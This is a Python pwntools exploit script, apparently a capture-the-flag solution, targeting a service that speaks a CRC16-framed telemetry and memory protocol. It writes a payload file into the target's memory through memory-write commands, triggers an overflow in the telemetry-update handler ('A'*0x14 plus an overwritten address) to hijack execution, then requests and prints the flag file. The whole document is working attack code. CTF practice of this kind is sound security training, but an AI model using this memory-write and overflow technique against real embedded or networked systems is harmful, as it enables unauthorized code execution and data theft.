from pwn import p32, p64, u32, u64, context, remote
from struct import pack, unpack
import os, sys, subprocess
from time import sleep 

context.log_level = 'debug'

def crc16(data : bytearray, offset , length):
    if data is None or offset < 0 or offset > len(data)- 1 and offset+length > len(data):
        return 0
    crc = 0x1D0F
    for i in range(0, length):
        crc ^= data[offset + i] << 8
        for j in range(0,8):
            if (crc & 0x8000) > 0:
                crc =(crc << 1) ^ 0xA02B
            else:
                crc = crc << 1
    return crc & 0xFFFF
    
def wrapMessage(target, cmd, data):
    return b"\x55\xAA" + pack("<HHbb", len(data), 
                crc16(data, 0, len(data)), target, cmd) + data

def unwrapMessage(msg): 
    start, length, crc, target, cmd = unpack("<HHHbb", msg[:8])
    return msg[8:8+length]

TLM_TARGET  = 1
TLM_REQ     = 0 
TLM_UPDATE  = 1
def req_tlm():
    return wrapMessage(TLM_TARGET, TLM_REQ, b"")

MEM_TARGET  = 2
MEM_READ    = 0
MEM_WRITE   = 1
def write_mem(addr, mem):
    header = pack(b"<HH", addr, len(mem))
    return wrapMessage(MEM_TARGET, MEM_WRITE, header + mem)

def read_mem(addr, length): 
    header = pack(b"<HH", addr, length)
    return wrapMessage(MEM_TARGET, MEM_READ, header)

SYS_TARGET  = 3
SHUTDOWN_CMD = 0
LOGGER_CMD = 3

def shutdown():
    return wrapMessage(SYS_TARGET, SHUTDOWN_CMD, b"")

def exploit():
    return wrapMessage(TLM_TARGET, TLM_UPDATE, b"A"*0x14 + p64(0x12800000))

def exploitChallenge(p):
    with open("payload.bin", 'rb') as f: 
        data = f.read()
    addr = 0
    initial = b''
    while addr < len(data):
        end = min(addr+64, len(data))
        m = write_mem(addr, data[addr:end])
        initial += m
        addr += 64
    p.write(initial + exploit())

    flagFile1 = b"/challenge/flag1.txt"
    flagFile2 = b"/challenge/bank/flag2.txt.enc"

    if len(sys.argv) > 1:
        p.write(flagFile1 + b"\x00"*(32-len(flagFile1)))
        p.write(flagFile2 + b"\x00"*(32-len(flagFile2)))
        return 

    # Key is automatically sent first, we don't use it in the first part
    # but this way we can reuse the same exploit for both parts.
    sleep(1)
    key = p.recv(64, timeout=5).rstrip(b'\0')
    
    p.write(flagFile1 + b"\x00"*(32-len(flagFile1)))
    sleep(1)
    flag1 = p.recv(128, timeout=5).rstrip(b'\0\n')
    print(flag1.decode('utf-8'))

if __name__ == "__main__":
    if len(sys.argv) > 1:
        p = open(sys.argv[1], 'wb')
    else: 
        p1 = remote(os.getenv("CHAL_HOST", "127.0.0.1"), os.getenv("CHAL_PORT", "19020"))
        # get ticket from environment
        ticket = os.getenv("TICKET")

        # pass ticket to ticket-taker
        if ticket:
            prompt = p1.recv(128)  # "Ticket please:"
            p1.send((ticket + "\n").encode("utf-8"))
            print("Sent Ticket")
    
        service_host, service_port = p1.read().rstrip().split(b':')[1:]
        sleep(1)
        p = remote(service_host, service_port)
        
    exploitChallenge(p)
